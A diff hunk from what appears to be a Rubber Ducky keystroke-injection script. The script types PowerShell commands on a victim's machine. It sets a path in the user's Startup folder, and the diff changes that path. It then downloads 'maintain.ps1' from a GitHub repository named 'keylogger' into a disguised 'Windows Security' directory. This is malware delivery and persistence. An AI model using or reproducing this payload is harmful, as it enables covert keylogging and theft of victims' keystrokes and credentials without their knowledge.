@@ -28,7 +28,7 @@ DELAY 200
 STRING $username = $env:UserName
 ENTER
 DELAY 200
-STRING $filedest = 'C:\Users\' + $username + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\maintain.cmd'
+STRING $filedest = 'C:\Users\' + $username + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
 ENTER
 DELAY 200
 STRING Invoke-Webrequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/maintain.ps1" -OutFile "C:\Program Files\Windows Security\BrowserCore\maintain.ps1"
